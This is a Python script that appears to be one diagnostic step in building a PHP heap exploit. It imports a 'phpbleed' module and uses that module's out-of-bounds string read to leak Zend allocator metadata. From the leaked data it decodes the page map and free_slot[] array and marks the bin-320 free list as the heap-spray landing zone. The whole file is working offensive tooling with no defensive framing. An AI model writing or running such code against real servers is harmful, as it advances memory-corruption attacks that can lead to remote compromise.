#!/usr/bin/env python3
"""R-6 diagnostic #3: dump the free_slot[] array region + the page map from
the same meta window, cross-reference which free_slot index points into
bin-320 SRUN pages (the spray landing zone)."""
import json
import struct
import importlib.util

spec = importlib.util.spec_from_file_location('pb', 'phpbleed_8089.py')
pb = importlib.util.module_from_spec(spec)
spec.loader.exec_module(pb)

st = json.load(open(pb.STATE_FILE))
heap_ref = st['heap_ref']
chunk = heap_ref & ~0x1FFFFF
print(f"chunk={chunk:#x}")

assert pb.pin_open(), "pin open failed"
r = pb.isstring_read(chunk + 0x40, pinned=True)
assert r, "meta read failed"
slen, data = r
print(f"meta len (heap->size?) = {slen}, window = {len(data)}B")

# page map at abs chunk+0x250 => data offset 0x250-0x58
MAP_OFF = 0x1F8
print("\n=== page map (pages 80..130) ===")
binpages = {}
for pn in range(1, 512):
    if MAP_OFF + pn * 4 + 4 > len(data):
        break
    info = struct.unpack_from('<I', data, MAP_OFF + pn * 4)[0]
    is_srun = (info & 0x80000000) != 0
    is_lrun = (info & 0x40000000) != 0
    b = info & 0x1F
    fc = (info >> 16) & 0x1FF
    if 80 <= pn <= 130:
        kind = ''
        if is_srun and not is_lrun:
            kind = f'SRUN bin={b*8}B free={fc}'
        elif is_lrun and not is_srun:
            kind = f'LRUN len={info & 0x1FF}'
        elif is_srun and is_lrun:
            kind = 'FREE?'
        print(f"  page {pn}: {info:#010x} {kind}")
    if is_srun and not is_lrun:
        binpages.setdefault(b, []).append((pn, fc))

print("\n=== free_slot[] array region (data offsets 8..280) ===")
# data starts at chunk+0x58 = heap+0x18 (if heap at chunk+0x40) => free_slot[0] at data+8
for i in range(8, 280, 8):
    v = struct.unpack_from('<Q', data, i)[0]
    if v == 0:
        continue
    tag = ''
    if chunk <= v < chunk + 0x200000:
        pg = (v - chunk) >> 12
        off = (v - chunk) & 0xFFF
        tag = f'-> page {pg} +{off:#x}'
        # which bin does that page belong to?
        info = struct.unpack_from('<I', data, MAP_OFF + pg * 4)[0]
        b = info & 0x1F
        if (info & 0x80000000) and not (info & 0x40000000):
            tag += f' (SRUN bin {b*8}B)'
            if b == 16:
                tag += '  <<<<< BIN-320 FREE LIST'
    print(f"  data[{i:3}] = {v:#018x} {tag}")

pb.pin_close()
print("done")
